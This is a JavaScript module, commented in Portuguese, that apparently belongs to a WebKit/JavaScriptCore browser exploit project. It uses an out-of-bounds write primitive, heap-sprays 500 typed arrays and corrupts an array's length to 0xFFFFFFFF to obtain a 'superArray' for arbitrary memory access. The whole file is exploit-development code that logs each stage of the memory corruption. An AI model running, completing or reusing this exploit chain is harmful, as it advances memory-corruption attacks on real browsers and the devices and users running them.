// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';

const FNAME_REPLICATE_LOG_V7_DYNAMICS = "replicateLogV7Dynamics_v27a";

const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Offsets CRUCIAIS DENTRO DO OOB_BUFFER
const OOB_OFFSET_FOR_M_VECTOR_CANDIDATE = 0x68;
const OOB_OFFSET_FOR_M_LENGTH_CANDIDATE = 0x70; // Também é o CORRUPTION_OFFSET_TRIGGER

// Valores INICIAIS a serem plantados, conforme seu Log.txt [00:51:23] (investigateControl_v7)
const INITIAL_VAL_FOR_0x68 = new AdvancedInt64(0x11223344, 0xAABBCCDD); // aabbccdd_11223344
// Seu log também plantava em 0x6C: 0xeeefffff_ffffffff. O trigger em 0x70 afetaria isso.
// Vamos simplificar e focar no que é copiado para o objeto JS: m_vector (de 0x68) e m_length (de 0x70).
// O valor inicial em 0x70 (m_length) será sobrescrito pelo trigger, então o que importa é o valor do trigger (0xFFFFFFFF) para o length.

const EXPECTED_M_LENGTH_IN_SUPERARRAY = 0xFFFFFFFF;
// O valor que o SEU LOG mostrou em oob_buffer[0x68] APÓS o trigger, que se tornaria o m_vector do superArray
const EXPECTED_M_VECTOR_IN_SUPERARRAY = new AdvancedInt64(0xAABBCCDD, 0x11223344); // 0x11223344_aabbccdd

const NUM_SPRAY_OBJECTS = 500;
const ORIGINAL_SPRAY_LENGTH = 8;

const MARKER_FOR_OOB_BUFFER_TARGET_CHECK = 0xFEEDBABE;
// Se m_vector do superArray for EXPECTED_M_VECTOR_IN_SUPERARRAY, e esse endereço
// apontar para o início do oob_array_buffer_real.dataPointer, então este marcador deve ser legível.
// Se EXPECTED_M_VECTOR_IN_SUPERARRAY for 0, então MARKER_OFFSET_IN_OOB_DATA deve ser 0.
// Como não é 0, esta verificação se torna mais complexa.
const MARKER_OFFSET_IN_OOB_DATA = 0x0; // Onde plantaremos no oob_array_buffer_real para testar superArray

let sprayedVictimObjects = [];

export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_REPLICATE_LOG_V7_DYNAMICS}: Replicar Dinâmica de Corrupção do Log [00:51:23] ---`, "test", FNAME_REPLICATE_LOG_V7_DYNAMICS);
    sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3("Ambiente OOB inicializado.", "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);

        // FASE 1: Spray
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = 0xF0F0F0F0 ^ i;
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização concluída.", "good", FNAME_REPLICATE_LOG_V7_DYNAMICS);

        // FASE 2: Plantar valores INICIAIS no oob_array_buffer_real
        logS3(`FASE 2: Plantando valores iniciais em oob_buffer...`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        logS3(`  Plantando VAL_0x68=${INITIAL_VAL_FOR_0x68.toString(true)} em oob_buffer[${toHex(OOB_OFFSET_FOR_M_VECTOR_CANDIDATE)}]`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        oob_write_absolute(OOB_OFFSET_FOR_M_VECTOR_CANDIDATE, INITIAL_VAL_FOR_0x68, 8);
        
        // O offset 0x70 (OOB_OFFSET_FOR_M_LENGTH_CANDIDATE) será sobrescrito pelo trigger.
        // O valor plantado aqui para m_length não importa tanto quanto o valor do trigger.
        // Mas para seguir o seu log, vamos plantar algo antes.
        // Seu log mostrava 0xeeefffff_ffffffff em 0x6C. E 0x70 era o alvo do trigger.
        // O que importa é que, após o trigger, o valor em OOB_OFFSET_FOR_M_LENGTH_CANDIDATE (0x70) no oob_buffer
        // se torna 0xFFFFFFFF (o LOW_DWORD do trigger), e é ESTE valor que esperamos que seja o m_length do superArray.
        // E o valor em OOB_OFFSET_FOR_M_VECTOR_CANDIDATE (0x68) no oob_buffer se torna EXPECTED_M_VECTOR_IN_SUPERARRAY.

        const chk_0x68_pre = oob_read_absolute(OOB_OFFSET_FOR_M_VECTOR_CANDIDATE, 8);
        logS3(`  Verificação Pós-Plantio (no oob_buffer ANTES DO TRIGGER):`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_FOR_M_VECTOR_CANDIDATE)}]=${chk_0x68_pre.toString(true)}`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);

        // FASE 3: Trigger OOB principal
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        
        // Verificar os valores NO OOB_BUFFER após o trigger, para ver se bate com seu log de sucesso
        const val_0x68_in_oob_after_trigger = oob_read_absolute(OOB_OFFSET_FOR_M_VECTOR_CANDIDATE, 8); 
        const val_0x70_in_oob_after_trigger = oob_read_absolute(OOB_OFFSET_FOR_M_LENGTH_CANDIDATE, 8); // Ler QWORD para ver o trigger completo
        
        logS3(`  Valores NO OOB_BUFFER APÓS trigger:`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_FOR_M_VECTOR_CANDIDATE)} (0x68)] = ${val_0x68_in_oob_after_trigger.toString(true)}`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        logS3(`      (Seu log de sucesso mostrava: ${EXPECTED_M_VECTOR_IN_SUPERARRAY.toString(true)})`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_FOR_M_LENGTH_CANDIDATE)} (0x70)] = ${val_0x70_in_oob_after_trigger.toString(true)}`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        logS3(`      (Esperamos LOW_DWORD de 0xFFFFFFFF aqui, que seria o m_length)`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);

        if (!val_0x68_in_oob_after_trigger.equals(EXPECTED_M_VECTOR_IN_SUPERARRAY) || 
            val_0x70_in_oob_after_trigger.low() !== EXPECTED_M_LENGTH_IN_SUPERARRAY) {
            logS3("    AVISO: A dinâmica de bytes no oob_buffer após o trigger NÃO corresponde exatamente ao seu log de sucesso [00:51:23]!", "warn", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        } else {
            logS3("    Dinâmica de bytes no oob_buffer após trigger PARECE corresponder ao seu log de sucesso!", "good", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        }
        await PAUSE_S3(300);

        // FASE 4: Identificar SuperArray (pelo length)
        logS3(`FASE 4: Tentando identificar SuperArray (pelo length ${toHex(EXPECTED_M_LENGTH_IN_SUPERARRAY)})...`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        let superArray = null;
        let superArrayIndex = -1;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === EXPECTED_M_LENGTH_IN_SUPERARRAY) {
                superArray = sprayedVictimObjects[i];
                superArrayIndex = i;
                logS3(`    !!!! SUPERARRAY (Uint32Array) ENCONTRADO !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_REPLICATE_LOG_V7_DYNAMICS);
                document.title = `SUPERARRAY Idx ${i}!`;
                break; 
            }
        }

        if (superArray) {
            logS3(`  SuperArray obtido. Seu m_vector DEVERIA ser ${EXPECTED_M_VECTOR_IN_SUPERARRAY.toString(true)}.`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
            logS3(`  Este m_vector NÃO é 0x0. Testar se ele aponta para o oob_array_buffer_real.dataPointer...`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);

            // Escrever um marcador nos dados do oob_array_buffer_real usando a primitiva OOB
            oob_write_absolute(MARKER_OFFSET_IN_OOB_DATA, MARKER_FOR_OOB_BUFFER_TARGET_CHECK, 4);
            logS3(`    Marcador ${toHex(MARKER_FOR_OOB_BUFFER_TARGET_CHECK)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA)}] via oob_write.`, "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);

            // Se o EXPECTED_M_VECTOR_IN_SUPERARRAY (0x11223344_aabbccdd) for o endereço do oob_array_buffer_real.dataPointer,
            // então superArray[MARKER_OFFSET_IN_OOB_DATA / 4] deve ler o marcador.
            // No entanto, o superArray (Uint32Array) indexa com base em seu m_vector.
            // Se m_vector for X, então superArray[i] lê de X + 4*i.
            // Para ler o marcador em oob_array_buffer_real.dataPointer + MARKER_OFFSET_IN_OOB_DATA,
            // precisaríamos que X (o m_vector do superArray) fosse oob_array_buffer_real.dataPointer.
            // E o índice seria MARKER_OFFSET_IN_OOB_DATA / 4.

            // O valor EXPECTED_M_VECTOR_IN_SUPERARRAY é muito específico (0x11223344_aabbccdd).
            // É improvável que seja o endereço exato do oob_array_buffer_real.dataPointer.
            // A menos que esse valor seja simbólico e o motor o interprete como tal.

            // Teste: Se o m_vector foi corrompido para EXPECTED_M_VECTOR_IN_SUPERARRAY,
            // e se o *ArrayBuffer subjacente* ao superArray também foi corrompido para ter dataPointer = 0,
            // então superArray[EXPECTED_M_VECTOR_IN_SUPERARRAY.low() / 4] leria daquele endereço. Isso é muito complexo.

            logS3("  SuperArray com length correto encontrado. O próximo passo seria determinar para onde seu m_vector aponta.", "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
            logS3("  Se o 'super array de 16GB' permitia R/W absoluto de 0x0, isso implica que o m_vector se tornou 0, não o valor do seu log.", "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
            logS3("  Se o m_vector é 0x11223344_aabbccdd, precisamos de uma forma de ler a partir desse endereço absoluto.", "info", FNAME_REPLICATE_LOG_V7_DYNAMICS);
            document.title = `SuperArray Len OK, MVec?`;


        } else {
            logS3("  Nenhum SuperArray (Uint32Array com length corrompido para 0xFFFFFFFF) identificado.", "error", FNAME_REPLICATE_LOG_V7_DYNAMICS);
            document.title = "SuperArray NÃO Encontrado (v27a)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_REPLICATE_LOG_V7_DYNAMICS}: ${e.message}`, "critical", FNAME_REPLICATE_LOG_V7_DYNAMICS);
        document.title = `${FNAME_REPLICATE_LOG_V7_DYNAMICS} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_REPLICATE_LOG_V7_DYNAMICS} Concluído ---`, "test", FNAME_REPLICATE_LOG_V7_DYNAMICS);
    }
}
